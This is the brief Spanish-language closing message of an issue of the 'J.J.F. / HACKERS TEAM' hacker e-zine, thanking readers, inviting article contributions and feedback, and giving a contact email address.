██████████████████████████████████████████████████████████████████████████████
<────────────────────────────────────────────────────────────────────────────>
    
        Pues aqui se acabo lo que se daba :). Esperamos que ye halla gustado
  y te animes a colaborar con nosotros en el e-zine, escribiendo algun
  articulo. Como veis en cada numero junto a nuestros colaboradores intentamos
  mejorar este e-zine para que lo disfrutes y aprendas la esencia del Hacker.

        Haver si para el siguiente numero nos enviais cosillas , je je je, ya
  sabeis que para cualquier cosa que nos querais decir como criticas,
  propuestas, sugerencias, teneis que escribir a:

   jjf_team@hotmail.com

                       HASTA EL PROXIMO NUMERO HACKERS!!    
                           - J.J.F. / HACKERS TEAM -       
                     
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=



```

</div>
